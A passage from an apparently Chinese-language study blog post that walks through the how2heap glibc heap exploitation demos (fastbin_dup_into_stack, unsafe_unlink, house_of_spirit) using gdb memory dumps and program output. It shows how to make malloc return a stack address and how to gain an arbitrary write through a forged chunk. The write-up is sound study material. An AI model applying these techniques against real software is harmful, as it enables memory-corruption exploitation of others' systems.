class="number">0</span>x00005<span class="number">55555757410</span></span><br><span class="line"><span class="number">0</span>x7ffff7dd3b10 &lt;main_arena+<span class="number">16</span>&gt;:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x7ffff7dd3b20 &lt;main_arena+<span class="number">32</span>&gt;:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x7ffff7dd3b30 &lt;main_arena+<span class="number">48</span>&gt;:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x7ffff7dd3b40 &lt;main_arena+<span class="number">64</span>&gt;:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line">gdb-peda$ x /<span class="number">20</span>gx <span class="number">0</span>x00005<span class="number">55555757410</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757410</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757420</span>:	<span class="number">0</span>x00005<span class="number">55555757430</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757430</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757440</span>:	<span class="number">0</span>x00005<span class="number">55555757410</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757450</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757460</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757470</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000020b91</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757480</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757490</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x55<span class="number">55557574a0</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>现在list是这样的arena指向0x555555757410，0x555555757410指向0x555555757430，0x555555757430又指向0x555555757410这样，我们继续，其实这里构成了一个内循环了</p>
+<p>首先malloc一次，arena已经指向0x0000555555757430了</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">2</span>gx <span class="number">0</span>x7ffff7dd3b00</span><br><span class="line"><span class="number">0</span>x7ffff7dd3b00 &lt;main_arena&gt;:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00005<span class="number">55555757430</span></span><br></pre></td></tr></table></figure>
+
+<p>思考一下：那么这里我们就可以看到这是将0x555555757410的fd写到这里来了，假如我们将0x555555757410的fd改了，那么就可以将我们需要的值写到arena的位置，之后再malloc，就返回这个地址，我们对这个地址就有写权限了（但一开始由于这个是free状态，所以我们无法改写，是实践截图如下：）</p>
+<p>那接下来再malloc，main_arena这里又指向0x0000555555757410</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">2</span>gx <span class="number">0</span>x7ffff7dd3b00</span><br><span class="line"><span class="number">0</span>x7ffff7dd3b00 &lt;main_arena&gt;:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00005<span class="number">55555757410</span></span><br><span class="line">gdb-peda$ x /<span class="number">20</span>gx <span class="number">0</span>x00005<span class="number">55555757410</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757410</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757420</span>:	<span class="number">0</span>x00005<span class="number">55555757430</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757430</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757440</span>:	<span class="number">0</span>x00005<span class="number">55555757410</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757450</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757460</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757470</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000020b91</span></span><br></pre></td></tr></table></figure>
+
+<p>那么正如作者所说</p>
+<p>Now, we have access to 0x555555757420 while it remains at the head of the free list.</p>
+<p>在之后将一个long long类型的局部变量赋值为0x20，这个用于伪造前一个chunk为空闲</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack_var = 0x20;</span><br></pre></td></tr></table></figure>
+
+<p>汇编看结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> x /gx <span class="variable">$rbp</span>-0x28</span></span><br><span class="line">0x7fffffffe4f8:	0x0000000000000020</span><br></pre></td></tr></table></figure>
+
+<p>之后将stack_var地址-8的地址覆盖第一个堆块（chunk）的fd</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*d = (<span class="name">unsigned</span> long long) (((<span class="name">char*</span>)<span class="symbol">&amp;stack_var</span>) - sizeof(<span class="name">d</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p>汇编如下：</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0</span>x555555554965 &lt;main+<span class="number">485</span>&gt;<span class="symbol">:</span>	lea    rax,[rbp-<span class="number">0</span>x28]</span><br><span class="line">=&gt; <span class="number">0</span>x555555554969 &lt;main+<span class="number">489</span>&gt;<span class="symbol">:</span>	sub    rax,<span class="number">0</span>x8</span><br></pre></td></tr></table></figure>
+
+<p>之后可以看到第一个chunk的fd已经被覆盖了成了0x00007fffffffe4f0，这是栈上变量stack_var的向前偏移8个字节的地址</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">10</span>gx <span class="number">0</span>x5<span class="number">55555757410</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757410</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757420</span>:	<span class="number">0</span>x00007fffffffe4f0	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757430</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757440</span>:	<span class="number">0</span>x00005<span class="number">55555757410</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555757450</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br></pre></td></tr></table></figure>
+
+<p>此时我们第3次malloc，0x00007fffffffe4f0已经写到main_arena上了</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /2gx <span class="number">0x7ffff7dd3b00</span></span><br><span class="line"><span class="number">0x7ffff7dd3b00</span> &lt;main_arena&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffe4f0</span></span><br></pre></td></tr></table></figure>
+
+<p>那么下次再malloc就直接从这0x00007fffffffe4f0头上取了</p>
+<p>最终的分配就返回了0x00007fffffffe500，因为返回的是指向数据区的指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /6gx 0x7fffffffe4f0</span><br><span class="line">0x7fffffffe4f0:	0x0000000000000000	0x0000000000000020</span><br><span class="line">0x7fffffffe500:	0x0000555555757420	0x0000555555757460</span><br><span class="line">0x7fffffffe510:	0x0000555555757440	0x0000555555757420</span><br></pre></td></tr></table></figure>
+
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
+<li>我们能只在不malloc的情况下直接改写第一个chunk的fd吗？</li>
+</ol>
+<p>这样会出现段错误</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/learn/how2heap<span class="comment"># ./fastbin_dup_into_stack_q1 </span></span><br><span class="line">This <span class="built_in">file</span> extends <span class="keyword">on</span> fastbin_dup.c <span class="keyword">by</span> tricking malloc <span class="keyword">into</span></span><br><span class="line"><span class="keyword">returning</span> a pointer <span class="keyword">to</span> a controlled location (<span class="keyword">in</span> this case, <span class="keyword">the</span> stack).</span><br><span class="line">The address we want malloc() <span class="keyword">to</span> <span class="literal">return</span> <span class="keyword">is</span> <span class="number">0x7ffc46138e78</span>.</span><br><span class="line">Allocating <span class="number">3</span> buffers.</span><br><span class="line"><span class="number">1</span>st malloc(<span class="number">8</span>): <span class="number">0x55efef1c0420</span></span><br><span class="line"><span class="number">2</span>nd malloc(<span class="number">8</span>): <span class="number">0x55efef1c0440</span></span><br><span class="line"><span class="number">3</span>rd malloc(<span class="number">8</span>): <span class="number">0x55efef1c0460</span></span><br><span class="line">Freeing <span class="keyword">the</span> <span class="keyword">first</span> one...</span><br><span class="line">If we free <span class="number">0x55efef1c0420</span> again, things will crash because <span class="number">0x55efef1c0420</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">the</span> top <span class="keyword">of</span> <span class="keyword">the</span> free <span class="built_in">list</span>.</span><br><span class="line">So, instead, we'll free <span class="number">0x55efef1c0440</span>.</span><br><span class="line">Now, we can free <span class="number">0x55efef1c0420</span> again, <span class="keyword">since</span> <span class="keyword">it</span>'s <span class="keyword">not</span> <span class="keyword">the</span> head <span class="keyword">of</span> <span class="keyword">the</span> free <span class="built_in">list</span>.</span><br><span class="line">Now <span class="keyword">the</span> free <span class="built_in">list</span> has [ <span class="number">0x55efef1c0420</span>, <span class="number">0x55efef1c0440</span>, <span class="number">0x55efef1c0420</span> ]. We'll now carry out our attack <span class="keyword">by</span> modifying data <span class="keyword">at</span> <span class="number">0x55efef1c0420</span>.</span><br><span class="line"><span class="number">3</span>rd malloc(<span class="number">8</span>): <span class="number">0x55efef1c0420</span>, putting <span class="keyword">the</span> stack address <span class="keyword">on</span> <span class="keyword">the</span> free <span class="built_in">list</span></span><br><span class="line">段错误</span><br></pre></td></tr></table></figure>
+
+<p>调试的时候不知道为啥改得不彻底，看了下原来是<code>mov    DWORD PTR [rax],edx</code>，是edx，可能</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">10</span>gx <span class="number">0</span>x5<span class="number">55555756410</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555756410</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555756420</span>:	<span class="number">0</span>x00005555ffffe4f8	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555756430</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555756440</span>:	<span class="number">0</span>x00005<span class="number">55555756410</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555756450</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></span><br></pre></td></tr></table></figure>
+
+<p>原来d声明的时候就是<code>unsigned long long *d = malloc(8);</code></p>
+<p>后来我改a为unsigned long long，free完直接改也是可以的</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511510134573.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/pic/1511510134577.jpg" alt></p>
+<ol start="2">
+<li>如果不伪造0x20行吗</li>
+</ol>
+<p>实践告诉你是不行的</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Error <span class="keyword">in</span> `<span class="regexp">/root/</span>learn<span class="regexp">/how2heap/</span>fastbin_dup_into_stack_q2<span class="string">': malloc(): memory corruption (fast): 0x00007fffffffe500 ***</span></span><br></pre></td></tr></table></figure>
+
+<p>因为fastbin申请的时候会检测这个堆块的大小是否是当前这条单向链表上的大小</p>
+<h1 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h1><p>free触发的unlink，以获得任意的写能力。</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Welcome <span class="keyword">to</span> unsafe unlink <span class="number">2.0</span>!</span><br><span class="line">Tested <span class="keyword">in</span> Ubuntu <span class="number">14.04</span>/<span class="number">16.04</span> <span class="number">64</span><span class="built_in">bit</span>.</span><br><span class="line">This technique can be used <span class="keyword">when</span> you have a pointer at a known location <span class="keyword">to</span> a region you can call unlink <span class="keyword">on</span>.</span><br><span class="line">The most common scenario <span class="keyword">is</span> a vulnerable <span class="keyword">buffer</span> that can be overflown <span class="keyword">and</span> has a global pointer.</span><br><span class="line">The point <span class="keyword">of</span> this exercise <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">use</span> free <span class="keyword">to</span> corrupt the global chunk0_ptr <span class="keyword">to</span> achieve arbitrary memory write.</span><br><span class="line"></span><br><span class="line">The global chunk0_ptr <span class="keyword">is</span> at <span class="number">0</span>x55e76c62d050, pointing <span class="keyword">to</span> <span class="number">0</span>x55e76d301420</span><br><span class="line">The victim chunk we are going <span class="keyword">to</span> corrupt <span class="keyword">is</span> at <span class="number">0</span>x55e76d3014b0</span><br><span class="line"></span><br><span class="line">We create a fake chunk inside chunk0.</span><br><span class="line">We setup the <span class="symbol">'next_free_chunk</span>' (fd) <span class="keyword">of</span> our fake chunk <span class="keyword">to</span> point near <span class="keyword">to</span> &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><br><span class="line">We setup the <span class="symbol">'previous_free_chunk</span>' (bk) <span class="keyword">of</span> our fake chunk <span class="keyword">to</span> point near <span class="keyword">to</span> &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><br><span class="line"><span class="keyword">With</span> this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == <span class="literal">False</span></span><br><span class="line">Fake chunk fd: <span class="number">0</span>x55e76c62d038</span><br><span class="line">Fake chunk bk: <span class="number">0</span>x55e76c62d040</span><br><span class="line"></span><br><span class="line">We need <span class="keyword">to</span> make sure the <span class="symbol">'size</span>' <span class="keyword">of</span> our fake chunk matches the <span class="symbol">'previous_size</span>' <span class="keyword">of</span> the <span class="keyword">next</span> chunk (fd-&gt;prev_size)</span><br><span class="line"><span class="keyword">With</span> this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == <span class="literal">False</span></span><br><span class="line">P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[<span class="number">1</span>]&amp;(~ <span class="number">0</span>x7))<span class="keyword">If</span> x = chunk0_ptr[<span class="number">1</span>] &amp; (~ <span class="number">0</span>x7), that <span class="keyword">is</span> x = *(chunk0_ptr + x).We just need <span class="keyword">to</span> set the *(chunk0_ptr + x) = x, so we can pass the check1.Now the x = chunk0_ptr[<span class="number">1</span>]&amp;(~<span class="number">0</span>x7) = <span class="number">0</span>, we should set the *(chunk0_ptr + <span class="number">0</span>) = <span class="number">0</span>, <span class="keyword">in</span> other words we should do nothing2.Further more we set chunk0_ptr = <span class="number">0</span>x8 <span class="keyword">in</span> <span class="number">64</span>-bits environment, <span class="keyword">then</span> *(chunk0_ptr + <span class="number">0</span>x8) == chunk0_ptr[<span class="number">1</span>], it<span class="symbol">'s</span> fine <span class="keyword">to</span> pass3.Finally we can also set chunk0_ptr = x <span class="keyword">in</span> <span class="number">64</span>-bits env, <span class="keyword">and</span> set *(chunk0_ptr+x)=x,<span class="keyword">for</span> example chunk_ptr0[<span class="number">1</span>] = <span class="number">0</span>x20, chunk_ptr0[<span class="number">4</span>] = <span class="number">0</span>x20Therefore, we set the <span class="symbol">'size</span>' <span class="keyword">of</span> our fake chunk <span class="keyword">to</span> the value <span class="keyword">of</span> chunk0_ptr[-<span class="number">3</span>]: <span class="number">0</span>x00000008</span><br><span class="line">You can find the commitdiff <span class="keyword">of</span> this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=<span class="number">17</span>f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><span class="line"></span><br><span class="line">We <span class="keyword">assume</span> that we have an overflow <span class="keyword">in</span> chunk0 so that we can freely change chunk1 metadata.</span><br><span class="line">We shrink the size <span class="keyword">of</span> chunk0 (saved as <span class="symbol">'previous_size</span>' <span class="keyword">in</span> chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><br><span class="line">It<span class="symbol">'s</span> important that our fake chunk begins exactly where the known pointer points <span class="keyword">and</span> that we shrink the chunk accordingly</span><br><span class="line"><span class="keyword">If</span> we had <span class="symbol">'normally</span>' freed chunk0, chunk1.previous_size would have been <span class="number">0</span>x90, however this <span class="keyword">is</span> its <span class="keyword">new</span> value: <span class="number">0</span>x80</span><br><span class="line">We mark our fake chunk as free by setting <span class="symbol">'previous_in_use</span>' <span class="keyword">of</span> chunk1 as <span class="literal">False</span>.</span><br><span class="line"></span><br><span class="line">Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><br><span class="line">You can find the source <span class="keyword">of</span> the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=<span class="number">07</span>c18a008c2ed8f5660adba2b778671db159a141#l1344</span><br><span class="line"></span><br><span class="line">At this point we can <span class="keyword">use</span> chunk0_ptr <span class="keyword">to</span> overwrite itself <span class="keyword">to</span> point <span class="keyword">to</span> an arbitrary location.</span><br><span class="line">chunk0_ptr <span class="keyword">is</span> now pointing where we want, we <span class="keyword">use</span> it <span class="keyword">to</span> overwrite our victim <span class="built_in">string</span>.</span><br><span class="line">Original value: Hello!~</span><br><span class="line"><span class="keyword">New</span> Value: BBBBAAAA <span class="number">0</span>m</span><br></pre></td></tr></table></figure>
+
+<p>2017年3月增加了个检测<br><a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30" target="_blank" rel="noopener">https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</a></p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+2017-03-17  Chris Evans  &lt;scarybeasts@gmail.com&gt;</span><br><span class="line">+</span><br><span class="line">+       * malloc/malloc.c (unlink): Add consistency<span class="built_in"> check </span>between size and</span><br><span class="line">+       next-&gt;prev-&gt;size, to further harden against 1-byte overflows.</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>首先malloc size是0x80，避免释放后放到fasebins</li>
+<li>申请两个chunk</li>
+<li>将chunk0的0x20和0x28偏移伪造成fd和bk，使P-&gt;fd-&gt;bk,P-&gt;bk-&gt;fd指向自己</li>
+<li>将chunk1的prev size覆盖为0x80，previous_in_use覆盖为0，那么free的时候找前一个chunk就指向我们伪造的chunk了，而且认为是free过了的，所以free chunk1就会触发unlink chunk0</li>
+</ol>
+<p>unlink源码</p>
+<p><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344" target="_blank" rel="noopener">https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</a></p>
+<p>free之前状态如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /50gx 0x555555757410</span><br><span class="line">0x555555757410:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x555555757420:	0x0000000000000000	0x0000000000000008</span><br><span class="line">0x555555757430:	0x0000555555756038	0x0000555555756040</span><br><span class="line">0x555555757440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757490:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557574a0:	0x0000000000000080	0x0000000000000090</span><br><span class="line">0x5555557574b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557574c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557574d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557574e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557574f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757530:	0x0000000000000000	0x0000000000020ad1</span><br></pre></td></tr></table></figure>
+
+<p>简单unlink代码如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>
+
+<p>那么指向chunk0的指针就会被改写为0x0000555555756038</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p chunk0_ptr</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = (uint64_t *) 0x555555756038</span></span><br></pre></td></tr></table></figure>
+
+<p>我们再对chunk0进行写入就可能覆盖那边指针了</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">50</span>gx <span class="number">0</span>x00005<span class="number">55555756038</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555756038</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00005<span class="number">55555756040</span></span><br><span class="line"><span class="number">0</span>x5<span class="number">55555756048</span> &lt;completed&gt;:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00005<span class="number">55555756038</span></span><br></pre></td></tr></table></figure>
+
+<p>所以作者使用chunk0_ptr<a href="http://pic.giantbranch.cn/pic/1511510095522.jpg" target="_blank" rel="noopener">3</a> = (uint64_t) victim_string;来覆盖chunk0指针指向victim_string</p>
+<p>之后便可以利用chunk0_ptr[0]修改victim_string的值了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511510095522.jpg" alt></p>
+<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><p>释放一个伪fastbin块，以使malloc返回一个近乎任意的指针。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/how2heap<span class="comment"># ./house_of_spirit </span></span><br><span class="line">This <span class="built_in">file</span> demonstrates <span class="keyword">the</span> house <span class="keyword">of</span> spirit attack.</span><br><span class="line">Calling malloc() once so that <span class="keyword">it</span> sets up its memory.</span><br><span class="line">We will now overwrite <span class="keyword">a</span> pointer <span class="built_in">to</span> point <span class="built_in">to</span> <span class="keyword">a</span> fake <span class="string">'fastbin'</span> region.</span><br><span class="line">This region (memory <span class="keyword">of</span> <span class="built_in">length</span>: <span class="number">80</span>) <span class="keyword">contains</span> <span class="literal">two</span> chunks. The <span class="keyword">first</span> starts <span class="keyword">at</span> <span class="number">0x7ffd0a5e3328</span> <span class="keyword">and</span> <span class="keyword">the</span> <span class="keyword">second</span> <span class="keyword">at</span> <span class="number">0x7ffd0a5e3358</span>.</span><br><span class="line">This chunk.size <span class="keyword">of</span> this region has <span class="built_in">to</span> be <span class="number">16</span> more than <span class="keyword">the</span> region (<span class="built_in">to</span> accomodate <span class="keyword">the</span> chunk data) <span class="keyword">while</span> still falling <span class="keyword">into</span> <span class="keyword">the</span> fastbin category (&lt;= <span class="number">128</span> <span class="keyword">on</span> <span class="title">x64</span>). <span class="title">The</span> <span class="title">PREV_INUSE</span> (<span class="title">lsb</span>) <span class="title">bit</span> <span class="title">is</span> <span class="title">ignored</span> <span class="title">by</span> <span class="title">free</span> <span class="title">for</span> <span class="title">fastbin-sized</span> <span class="title">chunks</span>, <span class="title">however</span> <span class="title">the</span> <span class="title">IS_MMAPPED</span> (<span class="title">second</span> <span class="title">lsb</span>) <span class="title">and</span> <span class="title">NON_MAIN_ARENA</span> (<span class="title">third</span> <span class="title">lsb</span>) <span class="title">bits</span> <span class="title">cause</span> <span class="title">problems</span>.</span><br><span class="line">... note that this has <span class="built_in">to</span> be <span 